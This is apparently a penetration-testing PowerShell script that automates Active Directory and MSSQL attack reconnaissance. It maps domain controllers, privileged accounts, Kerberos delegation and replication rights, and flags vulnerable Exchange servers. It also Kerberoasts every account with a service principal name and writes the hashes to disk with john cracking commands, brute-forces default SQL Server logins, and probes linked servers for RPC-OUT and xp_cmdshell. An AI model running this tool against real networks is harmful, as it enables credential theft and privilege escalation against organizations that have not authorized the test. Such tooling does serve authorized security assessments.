<#
    Dirty script for powershell AD enumeration / quickwins using PowerView, PowerUpSql and Windows ActiveDirectory modules
    
    Author: @phackt_ul
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>

#Requires -Version 2

[CmdletBinding()]
param(
  [Parameter(Mandatory=$true)]
  [String]$Domain
)

<#
    Importing custom modules
#>
Import-Module .\modules\GadgetExchange.psm1

if ((Get-Module -Name "GadgetExchange") -eq $null){
    Write-Error "[!] .\modules\GadgetExchange.psm1 not found, Exchange Servers enumeration will not be processed"
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Main  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

function Write-Banner {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [string]$Text
    )

    $Output = "`r`n`r`n"
    $Output += "+------+------------------------------------------------+------+`r`n"
    $Output += "| $Text `r`n"
    $Output += "+------+------------------------------------------------+------+"

    Write-Output $Output
    
}

function Write-BigBanner {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true)]
        [string]$Text
    )

    $Output = "`r`n`r`n"
    $Output += "################################################################`r`n"
    $Output += "################################################################`r`n"
    $Output += "| $Text `r`n"
    $Output += "################################################################`r`n"
    $Output += "################################################################"

    Write-Output $Output
    
}

function Format-KerberosResults {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $Objects
    )

    Process  {
        $_ | Select-Object Description,DistinguishedName,Enabled,GivenName,@{Name="msDS-AllowedToDelegateTo";Expression={($_."msDS-AllowedToDelegateTo" | Out-String).Trim()}},Name,ObjectClass,ObjectGUID,SamAccountName,@{Name="servicePrincipalName";Expression={($_.servicePrincipalName | Out-String).Trim()}},SID,@{Name="Surname";Expression={($_.Surname | Out-String).Trim()}},TrustedToAuthForDelegation,UserPrincipalName
    }    
}

function Output-Results {
    [CmdletBinding()] param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $Objects,
        [Parameter(Mandatory=$true)]
        [string]$Path,
        [Parameter(Mandatory=$false)]
        [switch]$Tee
    )

    Begin {
        $CSVPath = "$($Path).csv"
        $TXTPath = "$($Path).txt"
        [System.Collections.ArrayList]$Array = @()
    }

    Process  {
        $Array.Add($_) > $null
    }

    End {
        $Array | Export-CSV -NoTypeInformation -Path "$CSVPath"
        if($Tee){
            $Array | Tee-Object -File "$TXTPath"    
        } else {
            $Array | Out-File "$TXTPath"
        }
    }
}

#
# Check Commands are available
#

if (-Not (((Get-Module -Name "*PowerSploit*") -ne $null -or (Get-Module -Name "*PowerView*") -ne $null) -and (Get-Module -Name "ActiveDirectory") -ne $null -and (Get-Module -Name "PowerUpSQL") -ne $null)){
    throw "[!] Please import the following modules: PowerView (dev branch), ActiveDirectory (ADModule) and PowerUpSQL"
}

#
# Init Aliases
#

# New-Alias -Name Export-CSV -Value "Export-CSV -NoTypeInformation -NoTypeInformation" -Scope Process
# New-Alias -Name ConvertTo-Csv -Value "ConvertTo-Csv -NoTypeInformation -NoTypeInformation" -Scope

#
# Init / Setting variables
#

$CurDir = (Get-Location).Path
$DicoPath = "$CurDir\dico\has_complexity_no_dump"
$EnumDir = "$CurDir\results\$Domain\domain"
$EnumMSSQLDir = "$CurDir\results\$Domain\mssql"
$QuickWinsDir = "$EnumDir\quickwins"
$KerberoastDir = "$EnumDir\kerberoast"
$OutputDirs = @($EnumDir,$EnumMSSQLDir,$QuickWinsDir,$KerberoastDir)

$Global:ProgressPreference = 'SilentlyContinue'

#
# Creating output dirs
#

foreach ($OutputDir in $OutputDirs){
    If(!(Test-Path "$OutputDir"))
    {
          New-Item -ItemType Directory -Force -Path "$OutputDir" > $null
    }
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Domain Enumeration  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Starting enumeration of domain $Domain"

# PDC concept may be a bit oldschool
Write-Banner -Text "Looking for PDC"
$PDC = Resolve-DnsName -DnsOnly -Type SRV _ldap._tcp.pdc._msdcs.$Domain
Write-Output $PDC

Write-Banner -Text "Looking for all DCs"
$AllDCs = Resolve-DnsName -DnsOnly -Type SRV _ldap._tcp.dc._msdcs.$Domain
Write-Output $AllDCs

Write-Banner -Text "Checking spooler service is up on DCs"
foreach($DCip in $AllDCs.IP4Address){
    Write-Output "[+] ls \\$DCip\pipe\spoolss"
    ls \\$DCip\pipe\spoolss
}

# Testing if ADWS is up on PDC and port 389 is accessible

# /!\ because several PDCs have been returned during an engagement
$TargetDC = ($PDC | %{$_.IP4Address}) | Select-Object -First 1
Write-Host -ForegroundColor yellow "[+] Target DC ip: $TargetDC"

$adws = New-Object System.Net.Sockets.TCPClient -ArgumentList $TargetDC, 9389
if (! $adws.Connected){
    Write-Host -ForegroundColor red "[!] ADWS on PDC $($TargetDC) are not accessible"

    Write-Output "[+] Trying to find a DC with accessible ADWS..."
    foreach($DCip in $AllDCs.IP4Address){
        if ($DCip -ne $TargetDC){
            $adws = New-Object System.Net.Sockets.TCPClient -ArgumentList $DCip, 9389
            if ($adws.Connected){
                Write-Output "[+] Target DC set to $($DCip)"
                $TargetDC = $DCip
                break
            }
        }
    }

    if ($TargetDC -eq $PDC.IP4Address){
        Write-Host -ForegroundColor yellow "[+] Enumeration using Active Directory module may be limited"
    }
}

$RootDSE = Get-ADRootDSE -Server $TargetDC

# Test if RootDSE is null to construct the namingContext

if ($RootDSE -eq $null){
    Write-Output "[!] Root DSE can not be retrieved !"
}

Write-Banner -Text "Members of the DCs 'Domain Local' group Administrators"
foreach($DCip in $AllDCs.IP4Address){
    Write-Output "[+] Digging into $DCip"
    Get-NetLocalGroupMember -ComputerName $DCip -GroupName "Administrators"
}

Write-Banner -Text "Get-DomainSID"
$DomainSID = Get-DomainSID -Domain $Domain -Server $TargetDC
Write-Output $DomainSID

Write-Banner -Text "Get-Domain"
Get-Domain -Domain $Domain

Write-Banner -Text "Get-ADForest"
$Forest = Get-ADForest -Identity $Domain -Server $TargetDC
Write-Output $Forest

$DomainPolicy = Get-DomainPolicy -Domain $Domain -Server $TargetDC

Write-Banner -Text "(Get-DomainPolicy).SystemAccess"
$DomainPolicy."SystemAccess"

Write-Banner -Text "(Get-DomainPolicy).KerberosPolicy"
$DomainPolicy."KerberosPolicy"

Write-Banner -Text "Get-DomainTrust"
Get-DomainTrust -Domain $Domain -Server $TargetDC

Write-Banner -Text "Get-ForestTrust"
Get-ForestTrust -Forest $Forest.Name

Write-Banner -Text "Get-DomainUser"
Write-Output "[saving into ""$EnumDir\users.*""]"
Get-DomainUser -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\users"

Write-Banner -Text "Get-DomainGroup"
Write-Output "[saving into ""$EnumDir\groups.*""]"
Get-DomainGroup -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\groups"

Write-Banner -Text "Get-DomainComputer"
Write-Output "[saving into ""$EnumDir\computers.*""]"
Get-DomainComputer -Domain $Domain -Server $TargetDC | Output-Results -Path "$EnumDir\computers"

#
# Privileged accounts
#

Write-Banner -Text "Nested privileged users (RID >= 1000)"
<#
    From these Privileged Groups:
    "Administrators",        
    "Domain Admins",       
    "Enterprise Admins",   
    "Schema Admins",       
    "Account Operators",   
    "Backup Operators"
#>

$AdministratorsGroup = Get-DomainGroup -Domain $Domain -Identity "S-1-5-32-544"
$DomainAdminsGroup = Get-DomainGroup -Domain $Domain -Identity "$DomainSID-512"
$EnterpriseAdminsGroup = Get-DomainGroup -Domain $Domain -Identity "$DomainSID-519"
$SchemaAdminsGroup = Get-DomainGroup -Domain $Domain -Identity "$DomainSID-518"
$AccountOperatorsGroup = Get-DomainGroup -Domain $Domain -Identity "S-1-5-32-548"
$BackupOperatorsGroup = Get-DomainGroup -Domain $Domain -Identity "S-1-5-32-551"

$AdministratorsGroup.objectsid,$DomainAdminsGroup.objectsid,$EnterpriseAdminsGroup.objectsid,$SchemaAdminsGroup.objectsid,$AccountOperatorsGroup.objectsid,$BackupOperatorsGroup.objectsid | Get-DomainGroupMember -Recurse -Domain $Domain -Server $TargetDC 2> $null | Where-Object {($_.MemberObjectClass -eq "user") -and ([int]$_.MemberSID.split("-")[7] -ge 1000)} | Sort MemberSID -Unique | Output-Results -Path "$EnumDir\privileged_accounts" -Tee

<#
foreach($pa in $PrivilegedAccounts){

#
# Can be delegated ?
#

#
# Has delegation ?
#

#
# Can be AS_REP Roastable ?
#

#
# Is kerberoastable ?
#

#
# Has Replicating Directory Changes / Replicating Directory Changes All ?
#

#
# permissive ACLs on it
#

#
# logon sessions
#

#
# others ...
#

}
#>

#
# Exchange servers
#

Write-Banner -Text "Looking for Exchange servers"

# Only keeping for now CN=ms-Exch-Exchange-Server

$ExchangeServers = Get-ADExchangeServer -ConfigurationNamingContext $RootDSE.configurationNamingContext -Server $TargetDC | Where-Object {$_.Category -like "CN=ms-Exch-Exchange-Server*"} | Select-Object Version,FQDN,Roles,Class
$ExchangeServers | Output-Results -Path "$EnumDir\exchange_servers"

# Looking for [PrivExchange, CVE-2020-0688]
# https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV190007
# https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688
# https://docs.microsoft.com/fr-fr/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019

foreach($ExchangeServer in $ExchangeServers){

    ##################################################################################
    #PrivExchange
    $PrivExchange = $true
    switch($ExchangeServer.MajorVersion)
    {
        "15" {
                switch($ExchangeServer.MinorVersion)
                {
                    "2" {if([int]$ExchangeServer.Build -ge 330){$CVE20200688 = $false};Break}
                    "1" {if([int]$ExchangeServer.Build -ge 1713){$CVE20200688 = $false};Break}
                    "0" {if([int]$ExchangeServer.Build -ge 1473){$CVE20200688 = $false};Break}
                }
                Break
             }
        "14" {
                switch($ExchangeServer.MinorVersion)
                {
                    "3" {if([int]$ExchangeServer.Build -ge 442){$CVE20200688 = $false};Break}
                }
                Break
             }
    }

    $ExchangeServer | Add-Member -MemberType NoteProperty -Name PrivExchange -Value $PrivExchange
    ##################################################################################

    ##################################################################################
    #CVE-2020-0688
    $CVE20200688 = $true
    switch($ExchangeServer.MajorVersion)
    {
        "15" {
                switch($ExchangeServer.MinorVersion)
                {
                    "2" {if([int]$ExchangeServer.Build -ge 464){$CVE20200688 = $false};Break}
                    "1" {if([int]$ExchangeServer.Build -ge 1847){$CVE20200688 = $false};Break}
                    "0" {if([int]$ExchangeServer.Build -ge 1497){$CVE20200688 = $false};Break}
                }
                Break
             }
        "14" {
                switch($ExchangeServer.MinorVersion)
                {
                    "3" {if([int]$ExchangeServer.Build -ge 496){$CVE20200688 = $false};Break}
                }
                Break
             }
    }

    $ExchangeServer | Add-Member -MemberType NoteProperty -Name CVE-2020-0688 -Value $CVE20200688
    ##################################################################################

    Write-Output $ExchangeServer

    #Checking if server is vuln
    if($ExchangeServer.PrivExchange -eq $true){
        Write-Host -ForegroundColor yellow "[!] Exchange server $($ExchangeServer.FQDN) vulnerable to PrivExchange"
    }

    #Checking if server is vuln
    if($ExchangeServer.'CVE-2020-0688' -eq $true){
        Write-Host -ForegroundColor yellow "[!] Exchange server $($ExchangeServer.FQDN) vulnerable to CVE-2020-0688"
    }
}

Write-Banner -Text "Looking for users having a mailbox"
Write-Output "[saving into ""$EnumDir\users_with_mailbox.*""]"
Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -LDAPFilter "(msExchMailboxGuid=*)" | Output-Results -Path "$EnumDir\users_with_mailbox"


# ----------------------------------------------------------------
# ----------------------------------------------------------------
# Interesting stuff 
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Looking for interesting stuff"

#
# Deprecated OS
#

Write-Banner -Text "End-of-support Operating Systems (MS17-010)"
Get-DomainComputer -Domain $Domain -Server $TargetDC |  Where-Object {($_.OperatingSystem -like "*XP*") -or ($_.OperatingSystem -like "*Vista*") -or ($_.OperatingSystem -like "*2003*") -or ($_.OperatingSystem -like "*Windows 7*") -or ($_.OperatingSystem -like "*Windows 8*")} | Output-Results -Path "$QuickWinsDir\deprecated_os" -Tee

#
# AS_REP Roasting - no kerberos preauth
#

Write-Banner -Text "Users without kerberos preauth"
Get-DomainUser -PreauthNotRequired -Domain $Domain -Server $TargetDC | Output-Results -Path "$QuickWinsDir\users_without_krb_preauth" -Tee

#
# Kerberoast
#

Write-Banner -Text "All kerberoastable users"
$KerberoastableUsers = Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | Where-Object {$_.samaccountname -ne 'krbtgt'} 
$KerberoastableUsers | Output-Results -Path "$QuickWinsDir\kerberoastable_all" -Tee

Write-Banner -Text "Kerberoastable users members of DA"
Get-DomainUser -SPN -Domain $Domain -Server $TargetDC | ?{$_.memberof -match $DomainAdminsGroup.samaccountname -and $_.samaccountname -ne 'krbtgt'} | Output-Results -Path "$QuickWinsDir\kerberoastable_da" -Tee

Write-Banner -Text "Kerberoasting all users"
if($KerberoastableUsers){
    foreach($KerberoastableUser in $KerberoastableUsers){
        Invoke-Kerberoast -Domain $Domain -Server $TargetDC -OutputFormat john -Identity "$($KerberoastableUser.distinguishedname)" | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')} | Out-File "$KerberoastDir\$($KerberoastableUser.samaccountname).txt"
    }

    Write-Output "[saving tickets into ""$KerberoastDir\""]"
    Write-Host -ForegroundColor yellow "`r`n[!] Now run:"
    Write-Host -ForegroundColor yellow "    john --session=""Kerberoasting"" --wordlist=""$DicoPath"" $KerberoastDir\*"

    Write-Host -ForegroundColor yellow "`r`n[!] On linux, before john, run:"
    Write-Host -ForegroundColor yellow "    find /path/with/tickets -type f -name ""*.txt"" -print0 | xargs -0 dos2unix"    
} else {
    Write-Output "[+] No kerberoastable users"
}


#
# Kerberos delegation - unconstrained
#

Write-Banner -Text "Computers with unconstrained delegation - skip DCs"
Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_computers" -Tee

Write-Banner -Text "Users with unconstrained delegation"
Get-ADUSer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_users" -Tee

Write-Banner -Text "Managed Service Accounts with unconstrained delegation"
Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\unconstrained_msa" -Tee

#
# Kerberos delegation - constrained
#

Write-Banner -Text "Computers with constrained delegation"
Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_computers" -Tee

Write-Banner -Text "Users with constrained delegation"
Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_users" -Tee

Write-Banner -Text "Managed Service Accounts with constrained delegation"
Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_msa" -Tee

#
# Kerberos delegation - constrained with protocol transition
#

Write-Banner -Text "Computers with constrained delegation and protocol transition"
Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_computers" -Tee

Write-Banner -Text "Users with constrained delegation and protocol transition"
Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_users" -Tee

Write-Banner -Text "Managed Service Accounts with constrained delegation and protocol transition"
Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {TrustedToAuthForDelegation -eq $True} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,servicePrincipalName,Description | Format-KerberosResults | Output-Results -Path "$QuickWinsDir\constrained_t2a4d_msa" -Tee

#
# Find services with msDS-AllowedToActOnBehalfOfOtherIdentity
#

Write-Banner -Text "Finding services with msDS-AllowedToActOnBehalfOfOtherIdentity"
Get-ADComputer -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_computers" -Tee

Get-ADUser -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_users" -Tee

Get-ADServiceAccount -SearchBase $RootDSE.defaultNamingContext -Server $TargetDC -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,servicePrincipalName,Description | Output-Results -Path "$QuickWinsDir\actonbehalf_msa" -Tee

#
# Find principals (RID >= 1000) with Replicating Directory Changes / Replicating Directory Changes All
#

Write-Banner -Text "Finding principals with replicating permissions"
$DefaultNamingContext = $RootDSE.defaultNamingContext
cd "AD:\$DefaultNamingContext"

if ((Get-Location).Path -eq "$CurDir"){
    Get-DomainObjectAcl $RootDSE.defaultNamingContext -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get')}
} else
{
    $AllReplACLs = (Get-AcL).Access | Where-Object {$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'}

    foreach ($ACL in $AllReplACLs)
    {
        $user = New-Object System.Security.Principal.NTAccount($ACL.IdentityReference)
        $SID = $user.Translate([System.Security.Principal.SecurityIdentifier])
        $RID = $SID.ToString().Split("f-")[7]

        #Filter this list to RIDs above 1000 which will exclude well-known Administrator groups
        if([int]$RID -ge 1000)
        {
            $ReplicatingRight = ''
            if($ACL.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'){
                $ReplicatingRight = 'DS-Replication-Get-Changes-All'
            }

            if($ACL.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'){
                $ReplicatingRight = 'DS-Replication-Get-Changes'
            }

            Write-Output "[+] Permission '$ReplicatingRight' granted to '$($ACL.IdentityReference)'"
            # $ACL.RemoveAccessRule($ACL.Access)
        }
    }

    cd "$CurDir"
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# MSSQL Enumeration  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Starting enumeration of MSSQL instances"

#
# MSSQL enumeration
#

Write-Banner -Text "Enumerate MSSQL instances (looking for SPN service class MSSQL)"
$AllSQLInstances = Get-SQLInstanceDomain -IncludeIP -DomainController $TargetDC
$AllSQLInstances | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\instances.csv" | ConvertFrom-Csv

Write-Banner -Text "Are MSSQL instances accessible within current security context ?"
$Instances = $AllSQLInstances | Get-SQLConnectionTestThreaded
$AccessibleInstances = New-Object System.Collections.Generic.HashSet[String]
foreach($Instance in $Instances){
    if($Instance.Status -eq "Accessible"){

        #
        # Avoid doublon - instance vs instance,1433
        #

        if ($Instance.Instance -notmatch ".*,[0-9]+") 
        {
            $AccessibleInstances.Add("$($Instance.Instance),1433") > $null
        } else {
            $AccessibleInstances.Add("$($Instance.Instance)") > $null
        }
    }
}

#
# Create result directory instance
#

foreach($Instance in $AccessibleInstances){
    If(!(Test-Path "$EnumMSSQLDir\$Instance"))
    {
          New-Item -ItemType Directory -Force -Path "$EnumMSSQLDir\$Instance" > $null
    }
}

Write-Output $Instances

Write-Banner -Text "Find MSSQL instances versions"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Get-SQLServerInfo -Instance $Instance | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\$Instance\version.csv" | ConvertFrom-Csv
}

Write-Banner -Text "Find linked servers from each accessible MSSQL instances"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        $LinkedServers = Get-SQLServerLinkCrawl -Instance $Instance | Select-Object Version,Instance,Sysadmin,@{Name="Path";Expression={($_.Path | Out-String).Trim()}},
User,@{Name="Links";Expression={($_.Links | Out-String).Trim()}} | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\$Instance\linked_servers.csv" | ConvertFrom-Csv

        Write-Output $LinkedServers

        #
        # Trying to RPC-OUT to linked server to remotely execute stored procedure
        #

        $LinkedServers = $LinkedServers.Links
        $LinkedServers = ,"$($Instance.split('.')[0])" + $LinkedServers

        foreach($LinkedServer in $LinkedServers){

            if($LinkedServer){
                $result = Get-SQLServerLinkCrawl -Instance "$Instance" -QueryTarget "$LinkedServer" -Query "select name from sys.servers where is_rpc_out_enabled = 1 and is_linked=1;" | select -ExpandProperty CustomQuery

                foreach($datarow in $result){
                    if($datarow.Name){
                        Write-Host -ForegroundColor yellow "[+] '$LinkedServer' can RPC-OUT to '$($datarow.Name)'"
                    }
                }
            }     
        }
}

# ----------------------------------------------------------------
# ----------------------------------------------------------------
# MSSQL Audit  
# ----------------------------------------------------------------
# ----------------------------------------------------------------

Write-BigBanner -Text "Auditing MSSQL instances"

#
# MSSQL audit
#

Write-Banner -Text "MSSQL instances common credentials bruteforce"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Get-SQLServerLoginDefaultPw -Instance $Instance | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\$Instance\bruteforce_creds.csv" | ConvertFrom-Csv
}

Write-Banner -Text "Is xp_cmdshell enabled through linked servers of each accessible instances"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Get-SQLServerLinkCrawl -Instance $Instance -Query "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS 'is_XpCmdShell' FROM master.sys.configurations WHERE name like '%cmd%';" |
 select Version,Instance,Sysadmin,User -ExpandProperty CustomQuery | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\$Instance\linked_servers_xp_cmdshell_enabled.csv" | ConvertFrom-Csv
}

Write-Banner -Text "Auditing each accessible MSSQL Instances"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Invoke-SQLAudit -Instance $Instance | ConvertTo-Csv -NoTypeInformation | Tee-Object -File "$EnumMSSQLDir\$Instance\audit.csv" | ConvertFrom-Csv
}
